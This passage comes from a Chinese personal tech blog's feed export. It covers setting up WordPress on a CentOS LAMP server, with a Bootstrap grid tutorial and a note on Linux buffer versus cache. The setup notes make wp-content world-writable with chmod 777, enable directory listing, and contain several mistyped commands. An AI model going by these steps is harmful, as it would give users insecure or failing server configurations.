        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/webyzx/article/details/78666344">Linux服务器上简单搭建wordpress</a></p><p>httpd.conf   servername</p><h4 id="1-配置环境"><a href="#1-配置环境" class="headerlink" title="1,配置环境"></a>1,配置环境</h4><p>(LAMP=Linux+Apache+Mysql/MariaDB+Perl/PHP/Python)</p><h5 id="1-1-安装apache-php-mysql"><a href="#1-1-安装apache-php-mysql" class="headerlink" title="1.1 安装apache php mysql"></a>1.1 安装apache php mysql</h5><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y httpd php php-fpm mysql mysql-<span class="keyword">server</span> php-mysql</span><br></pre></td></tr></table></figure><p>问题：安装mysql-server 无可用包 </br><br><code>yum install -y mysql-server </code>  错误 </br></p><span id="more"></span>解决办法：[centos7下解决yum install mysql-server没有可用包](https://www.cnblogs.com/yowamushi/p/8043054.html)<h5 id="1-2-启动相应服务"><a href="#1-2-启动相应服务" class="headerlink" title="1.2 启动相应服务"></a>1.2 启动相应服务</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">service httpd start</span><br><span class="line">service mysqld start</span><br><span class="line"><span class="section">service php-fpm start</span></span><br><span class="line"><span class="section">---------------------------------</span></span><br><span class="line">systemctl start httpd.service</span><br><span class="line">systemctl start mysqld.service</span><br><span class="line"><span class="section">systemctl start php-fpm.service</span></span><br><span class="line"><span class="section">------------------------</span></span><br><span class="line">netstat -tunlp  检查服务的运行情况//</span><br><span class="line"><span class="code">    httpd(apache)   80</span></span><br><span class="line"><span class="code">    mysql           3306</span></span><br><span class="line"><span class="section">    php-fpm         9000</span></span><br><span class="line"><span class="section">--------------------------</span></span><br><span class="line">systemctl enable httpd.service</span><br><span class="line">systemctl enable php-fpm servive  #开机自启(mysqld默认启动?)</span><br><span class="line">systemctl disable httpd.service  #开机不启动</span><br></pre></td></tr></table></figure><h5 id="1-3-浏览初始页面"><a href="#1-3-浏览初始页面" class="headerlink" title="1.3 浏览初始页面"></a>1.3 浏览初始页面</h5><p>默认python3  会影响firewall服务<br><a href="http://note.youdao.com/noteshare?id=a46890e66fe74e91320f316fcbe55c90&sub=7B16D1BB6144452293BA58676B826E69">Linux问题-笔记</a></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#防火墙添加服务</span></span><br><span class="line"><span class="string">firewall-cmd</span> <span class="built_in">--list-all</span></span><br><span class="line"><span class="string">firewall-cmd</span> <span class="built_in">--permanent</span> <span class="built_in">--add-service=http</span></span><br><span class="line"><span class="string">systemctl</span> <span class="string">restart</span> <span class="string">firewalld</span></span><br><span class="line"></span><br><span class="line">服务器 需要添加 <span class="string">TCP:80 </span>入规则</span><br></pre></td></tr></table></figure><p>通过服务器ip，可以看到apache的测试页面</p><h5 id="1-4-mysql-的简单配置"><a href="#1-4-mysql-的简单配置" class="headerlink" title="1.4 mysql 的简单配置"></a>1.4 mysql 的简单配置</h5><p>需要为mysql设置相应的用户去访问管理。</br><br>先设定初始 root 密码,在创建 wordpress 数据库</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u root password <span class="string">&quot;XXXXX&quot;</span></span><br><span class="line">mysql -u root -p  <span class="comment">#进入数据库</span></span><br><span class="line">    create database wordpress;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><h4 id="2-搭建-wordpress"><a href="#2-搭建-wordpress" class="headerlink" title="2, 搭建 wordpress"></a>2, 搭建 wordpress</h4><h5 id="2-1-下载-wordpress"><a href="#2-1-下载-wordpress" class="headerlink" title="2.1 下载 wordpress"></a>2.1 下载 wordpress</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span>wordpress.org/latest.tar.gz</span><br></pre></td></tr></table></figure><h5 id="2-2-配置-wordpress"><a href="#2-2-配置-wordpress" class="headerlink" title="2.2 配置 wordpress"></a>2.2 配置 wordpress</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="regexp">/var/</span>blog</span><br><span class="line">tar –zxf latest.tar.gz -C <span class="regexp">/var/</span>blog</span><br><span class="line">chown –R apache:apache <span class="regexp">/var/</span>blog  <span class="comment">#目录赋予apache权限</span></span><br></pre></td></tr></table></figure><h5 id="2-3-配置apache-httpd"><a href="#2-3-配置apache-httpd" class="headerlink" title="2.3 配置apache httpd"></a>2.3 配置apache httpd</h5><p>打开/etc/httpd/conf/httpd.conf文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> 域名</span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">&quot;/var/blog/wordpress&quot;</span></span><br><span class="line">    <span class="section">&lt;Directory <span class="string">&quot;/var/blog/wordpress&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None      </span><br><span class="line">        <span class="attribute"><span class="nomarkup">Order</span></span> <span class="literal">deny</span>,<span class="literal">allow</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">Allow</span></span> from <span class="literal">all</span></span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line">    <span class="attribute">ErrorLog</span> logs/blog-error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> logs/blog-access.log common</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>CentOS 7 加上 <code>Require all granted</code></p><h5 id="2-4-配置数据库"><a href="#2-4-配置数据库" class="headerlink" title="2.4 配置数据库"></a>2.4 配置数据库</h5><p>已创建wordpress，见 1.4</p><h5 id="2-5-重启apache"><a href="#2-5-重启apache" class="headerlink" title="2.5 重启apache"></a>2.5 重启apache</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">service</span> httpd restart  <span class="comment">#修改httpd.conf 都要重启</span></span><br></pre></td></tr></table></figure><p>访问：   .wp-admin/setup-config.php<br>其他：<br><a href="https://blog.51cto.com/laotang6/2163983">https://blog.51cto.com/laotang6/2163983</a></p><h5 id="2-6-问题"><a href="#2-6-问题" class="headerlink" title="2.6 问题"></a>2.6 问题</h5><p>问题：把wordpress解压在<code>/var/blog</code>,提示 <code>Forbidden</code>，不能访问。<br>未解决：暂时放在 81 端口，通过 <code>localhost:81/wp-admin/setup-config.php</code>可以访问到被 Forbidden 。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"> <span class="attribute"><span class="nomarkup">Listen</span></span> <span class="number">81</span></span><br><span class="line"> <span class="section">&lt;VirtualHost *<span class="number">:81</span>&gt;</span></span><br><span class="line">     <span class="attribute"><span class="nomarkup">ServerName</span></span> www.kass<span class="number">1</span>.com:<span class="number">81</span></span><br><span class="line">     <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/blog/wordpress</span><br><span class="line">     <span class="section">&lt;Directory <span class="string">&quot;/var/blog/wordpress&quot;</span>&gt;</span></span><br><span class="line">         <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">         <span class="attribute">AllowOverride</span> None</span><br><span class="line">         <span class="comment">#Order deny,allow</span></span><br><span class="line">         <span class="comment">#Allow from all</span></span><br><span class="line">         <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">     <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"> <span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="临时方案"><a href="#临时方案" class="headerlink" title="临时方案"></a>临时方案</h5><p>解压到 <code>/var/www/http/blog/</code>目录下。http.conf 添加如下配置.<br>(如果直接放在<code>/var/www/html/wordpress</code>目录，就不用添加配置)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地时：hosts-&gt; localost  www.kass1.com</span></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> www.kass<span class="number">1</span>.com:<span class="number">80</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/blog/wordpress</span><br><span class="line">    <span class="section">&lt;Directory <span class="string">&quot;/var/www/blog/wordpress&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="comment">#Order deny,allow</span></span><br><span class="line">        <span class="comment">#Allow from all</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><h5 id="一个IP对应多个域名-解析到不同目录"><a href="#一个IP对应多个域名-解析到不同目录" class="headerlink" title="一个IP对应多个域名(解析到不同目录)"></a>一个IP对应多个域名(解析到不同目录)</h5><ul><li>ServerName — 主机名（域名或公网IP） </li><li>ServerAlias — 别名（二级域名或其他域名或IP） </li><li>DocumentRoot — 文件目录（表示将域名映射至该文件目录）。<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#NameVirtualHost *:80</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> www.mywebsite<span class="number">1</span>.com</span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/htmla</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> mywebsite<span class="number">1</span>.com</span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/htmlb</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> www.mywebsite<span class="number">2</span>.com</span><br><span class="line">    <span class="attribute">ServerAlias</span> mywebsite<span class="number">2</span>.com</span><br><span class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/htmlc</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-wordpress-安装"><a href="#3-wordpress-安装" class="headerlink" title="3. wordpress 安装"></a>3. wordpress 安装</h4><p><a href="https://blog.51cto.com/laotang6/2163983">相关链接</a></p><p>打开 <code>[servername]/wp-admin/setup-config.php</code>,进行安装</p><ul><li>wp-config.php</li><li>Ftp 配置()<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yum install vsftpd -y </span><br><span class="line">systemctl restart vsftpd</span><br><span class="line"></span><br><span class="line">firewall-cmd <span class="params">--permanent</span> <span class="params">--add-service=ftp</span></span><br><span class="line">firewall-cmd <span class="params">--reload</span></span><br><span class="line"></span><br><span class="line">useradd laotang6  <span class="comment">#新建用户密码</span></span><br><span class="line">passwd laotang6</span><br><span class="line"></span><br><span class="line">vim <span class="string">/etc/php.ini</span></span><br><span class="line">    upload_max_filesize = 50M</span><br><span class="line">    post_max_size = 50M</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>需要开机自动启动 httpd 吗 <code>systemctl enable httpd</code></li></ul><p>需要更改权限以写入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chown -R apache:apache \var\www\blog\wordpress</span><br><span class="line"><span class="comment">#----------------------</span></span><br><span class="line">chmod -R <span class="number">777</span> <span class="regexp">/var/</span>www<span class="regexp">/blog/</span>wordpress/wp-content</span><br></pre></td></tr></table></figure><h4 id="4-其他"><a href="#4-其他" class="headerlink" title="4,其他"></a>4,其他</h4><p>输入 ip绑定的域名，提示 无法访问。需要备案。<br><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0qqgi29pvj30wn0eimyb.jpg" alt="image"><br>暂时输入 ip<br>ServerName : localhost</p><p>华为云  1元1年的 xyz 后缀  临时使用</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 服务器上的使用记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> Linux </tag>
            
            <tag> Centos </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2, Bootstrap 网格系统</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/2-bootstrap-%E7%BD%91%E6%A0%BC%E7%B3%BB%E7%BB%9F/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/2-bootstrap-%E7%BD%91%E6%A0%BC%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="CSS-概述"><a href="#CSS-概述" class="headerlink" title="CSS 概述"></a>CSS 概述</h4><h5 id="Html5-文档类型"><a href="#Html5-文档类型" class="headerlink" title="Html5 文档类型"></a>Html5 文档类型</h5><h5 id="移动设备优先"><a href="#移动设备优先" class="headerlink" title="移动设备优先"></a>移动设备优先</h5><p>添加 <strong>viewport meta</strong> 标签 ,确保网页支持适当的绘制和触屏缩放</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 可添加 user-scalable=no 禁用缩放 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- maximum-scale=1.0 和 user-scalable=no 共用后，只能滚动屏幕 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&#x27;width=device-width,initial-scale=1.0&#x27;</span></span></span><br></pre></td></tr></table></figure><h5 id="响应式图像"><a href="#响应式图像" class="headerlink" title="响应式图像"></a>响应式图像</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;...&quot;</span> <span class="attribute">class</span>=<span class="string">&#x27;img-responsive&#x27;</span> <span class="attribute">alt</span>=<span class="string">&#x27;响应式图像&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="全局显示、排版和链接"><a href="#全局显示、排版和链接" class="headerlink" title="全局显示、排版和链接"></a>全局显示、排版和链接</h5><h6 id="全局显示"><a href="#全局显示" class="headerlink" title="全局显示"></a>全局显示</h6><p>body: 字体，字体大小，行高度，文本颜色，背景颜色 font-family,font-size,line-height,color,background-color</p><h5 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h5><p>使用 @font-family-base、@font-size-base、和 @line-height-base 属性作为排版样式。</p><h5 id="链接样式"><a href="#链接样式" class="headerlink" title="链接样式"></a>链接样式</h5><p>使用 @link-color 设置全局链接的颜色</p><h5 id="避免跨浏览器不一致"><a href="#避免跨浏览器不一致" class="headerlink" title="避免跨浏览器不一致"></a>避免跨浏览器不一致</h5><p> 使用 <a href="https://necolas.github.io/normalize.css/">Normalize</a>建立跨浏览器的一致性。  Normalize.css</p><h5 id="容器-Container"><a href="#容器-Container" class="headerlink" title="容器( Container )"></a>容器( Container )</h5><h4 id="Bootstrap-网格系统"><a href="#Bootstrap-网格系统" class="headerlink" title="Bootstrap 网格系统"></a>Bootstrap 网格系统</h4><h5 id="网格系统"><a href="#网格系统" class="headerlink" title="网格系统"></a>网格系统</h5><p> Bootstrap 3 和 Bootstrap 4 最大的区别 在于 Bootstrap 4 使用的是 <strong>flexbox</strong>(弹性盒子) 而不是 <strong>浮动</strong></p><h5 id="列类-定制各尺寸设备"><a href="#列类-定制各尺寸设备" class="headerlink" title="列类 定制各尺寸设备"></a>列类 定制各尺寸设备</h5> <figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.col-xs-   .col-sm-   .col-md-   .col-lg-</span><br><span class="line">1<span class="number"> 1 </span>1<span class="number"> 1 </span>1<span class="number"> 1 </span>1<span class="number"> 1 </span>1<span class="number"> 1 </span>1<span class="number"> 1 </span>1<span class="number"> 1 </span>1 1</span><br><span class="line">  <span class="number"> 4 </span>     <span class="number"> 4 </span>      <span class="number"> 4 </span>    4</span><br><span class="line">  <span class="number"> 4 </span>             8</span><br><span class="line">       <span class="number"> 6 </span>             6</span><br><span class="line">                12</span><br></pre></td></tr></table></figure><p> 小型设备 col6 x 2<br> 中型设备 col4 x 3<br> 大型设备 col3 * 4<br> 分别添加清除浮动 <a href="https://www.w3cschool.cn/tryrun/showhtml/trybs_ref_hlp_clearfix">在线例子</a><br> <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>     <span class="number">4</span></span><br><span class="line"><span class="number">6</span>     <span class="number">4</span></span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;clearfix visible-sm-block&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line"><span class="number">6</span>     <span class="number">4</span></span><br><span class="line"> &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;clearfix visible-md-block&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure></p><h5 id="container"><a href="#container" class="headerlink" title="container"></a>container</h5><p>两种类型的容器类：</p><ul><li><strong>.container</strong> class  </br><ul><li>创建一个固定宽度的容器，其样式显示在</li></ul></li><li><strong>.container-fluid</strong> class<ul><li>全宽度流体容器</li></ul></li></ul><h5 id="网格列"><a href="#网格列" class="headerlink" title="网格列"></a>网格列</h5><ul><li>嵌套列<br><code>div.container&gt;div.row&gt;div.col-md-6&gt;(div.col-md-6)*2^+div.col-md-6</code></li><li>偏移列<br><code>col-xs-offset-*</code></li><li>push  pull<br><code>col-xs-push-*     col-xs-pull-*</code></li></ul><h4 id="动态布局"><a href="#动态布局" class="headerlink" title="动态布局"></a>动态布局</h4><ul><li>台式机的设计<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">div</span>.row&gt;<span class="keyword">div</span>.col-md<span class="number">-12</span>^+<span class="keyword">div</span>.row&gt;(<span class="keyword">div</span>.col-md<span class="number">-4</span>)*<span class="number">3</span></span><br></pre></td></tr></table></figure></li><li>平板电脑的设计 </br><br>平板可以以两种格式查看：纵向和横向。</br><br>横向是为中等大小的显示，纵向是为小尺寸的显示。  <code>col-md-*   col-sm-* </code><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">div</span>.row&gt;(div.col-md-<span class="number">4</span>.col-sm-<span class="number">6</span>&gt;h<span class="number">3</span>&#123;Post Title n &#125;+p&#123;some words)*<span class="number">6</span></span><br></pre></td></tr></table></figure><ul><li>手机的设计</br><br>移动设备的横向视图使用 <code>col-sm-*</code>,纵向视图使用<code>col-xs-*</code></li></ul></li></ul><h4 id="Bootstrap-实用类"><a href="#Bootstrap-实用类" class="headerlink" title="Bootstrap 实用类"></a>Bootstrap 实用类</h4><h5 id="元素可见性-visible"><a href="#元素可见性-visible" class="headerlink" title="元素可见性 .visible - * - *"></a>元素可见性 .visible - * - *</h5><p>屏幕尺寸在特定范围内元素可见</p><p><code>.visible-xs|sm|md|lg-inline|block|inline-block</code></p><h5 id="元素隐藏"><a href="#元素隐藏" class="headerlink" title="元素隐藏"></a>元素隐藏</h5><p>屏幕尺寸在特定范围内元素隐藏</p><h5 id="显示-隐藏打印"><a href="#显示-隐藏打印" class="headerlink" title="显示/隐藏打印"></a>显示/隐藏打印</h5><table><thead><tr><th>描述</th><th>描述</th></tr></thead><tbody><tr><td><code>.visble-print-block</code></td><td>隐藏浏览器呈现的块元素，打印时可见</td></tr><tr><td><code>.visble-print-inline</code></td><td>隐藏浏览器呈现的内嵌元素，打印时可见</td></tr><tr><td><code>.visble-print-inline-block</code></td><td>隐藏浏览器呈现的inline-block元素，打印时可见</td></tr><tr><td><code>.hidden-print</code></td><td>在浏览器显示的元素，打印时隐藏</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Bootstrap教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bootstrap </tag>
            
            <tag> W3School </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载笔记：Linux 中 Buffer 和 Cache 的区别</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E8%BD%AC%E8%BD%BD%E7%AC%94%E8%AE%B0%EF%BC%9Alinux-%E4%B8%AD-buffer-%E5%92%8C-cache-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E8%BD%AC%E8%BD%BD%E7%AC%94%E8%AE%B0%EF%BC%9Alinux-%E4%B8%AD-buffer-%E5%92%8C-cache-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p><a href="http://note.youdao.com/noteshare?id=18861aef9dde3778244f8d737f9e6f5d&sub=wcp155115661803792">原文章笔记</a></p><h5 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h5><ul><li>CPU : <ul><li>速度超快</li></ul></li><li>Cache (缓存区):<ul><li>充当是 <strong>CPU</strong> 和<strong>主内存</strong>的中间件</li><li>容量较小</li><li>速度很快</li><li>保存着 CPU 刚用过的数据或循环使用的部分数据</li><li>不是缓存文件，而是缓存块(块是I/O读写最小的单位)</li><li>一般用在 I/O 请求上</li></ul></li><li>Buffer (缓冲区):<ul><li>用于存储速度不同步的设备或优先级不同的设备之间传输数据</li><li>可以减少进程件通信需要等待的时间</li></ul></li></ul><span id="more"></span><p><strong>Cache</strong> 是”为了弥补告诉设备和低速设备之间的矛盾”而设立的中间层。</br><br><strong>问题</strong>：CPU 速度很快，但 CPU 执行的指令是从内存取出，计算的结果也要写如内存，但内存的响应速度跟不上 CPU。</br><br><strong>解决办法</strong>：在 CPU 和内存中间加一块”蓄水池”,即 Cache 。<br>当 CPU 要读内存的时候<strong>先读 Cache</strong> 再读内存，<br></br>(<strong>初始化:</strong>)但一开始 Cache 是<strong>空的</strong>，只能从内存区，所以这时很慢(CPU 需要等待内存的响应)。但从内存取回的还有其他的、当前不需要的指令，然后把这些指令存在 Cache 里备用;<br></br> CPU 再区指令的时候还是先读 Cache ， 有所需指令，直接取出，无则等待内存响应。</p><p>Cpu -&gt; CPU.Cache -&gt; 内存 -&gt; 磁盘.Cache -&gt; 磁盘 ?</br><br>CPU 的 Cache ： 可以有好几层，而且还分为 <strong>数据Cache</strong> 和 <strong>指令Cache</strong>。<br>磁盘 的 Cache：</p><p><strong>Buffer</strong>: 化零为整(比如在内存里开辟了一块 Buffer ，数据<strong>暂时</strong>写入 Buffer ，攒到一定大小在<strong>一次性写入</strong>硬盘)</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>Cache的存在是为了解决什么问题？速度太慢了，要<strong>加快速度</strong>！  是系统两端处理速度不匹配时的一种这种策略。</li><li>Buffer的存在是为了解决什么问题？找个<strong>临时的存储空间</strong>！ 减少短期内突发 I/O 的影响 。(网络上下载东西，瞬时速率可能有较大变化，引入Buffer使得OS接收数据的速率稳定，<strong>减少对磁盘的伤害</strong>)</li><li>相同点：都是2个层面的中间层，都是内存</li><li>不同点：Cache 解决的是时间问题，Buffer 解决的是空间问题。</li><li>解决方案：<strong>内存RAM</strong>, Cache 利用的是 RAM 提供的高读写速度， Buffer 利用的是 RAM 提供的存储容量。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buffer </tag>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1, Bootstrap 引言</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/1-bootstrap-%E5%BC%95%E8%A8%80/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/1-bootstrap-%E5%BC%95%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<ul><li>基本结构</li><li>CSS</li><li>组件</li><li>JavaScript 插件</li><li>定制</li></ul><h5 id="Bootstrap-需要引入文件"><a href="#Bootstrap-需要引入文件" class="headerlink" title="Bootstrap 需要引入文件"></a>Bootstrap 需要引入文件</h5><ol><li>核心 CSS 文件</li><li>核心 JS 文件 (许先引入 jquery )<h5 id="Bootstrap-CDN-推荐"><a href="#Bootstrap-CDN-推荐" class="headerlink" title="Bootstrap CDN 推荐"></a>Bootstrap CDN 推荐</h5></li><li>BootCDN (国内)</li><li><a href="https://www.staticfile.org/">https://www.staticfile.org/</a> (国内)</li><li><a href="https://cdnjs.com/">https://cdnjs.com/</a>     (国际)<span id="more"></span><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 新 Bootstrap 核心 CSS 文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span 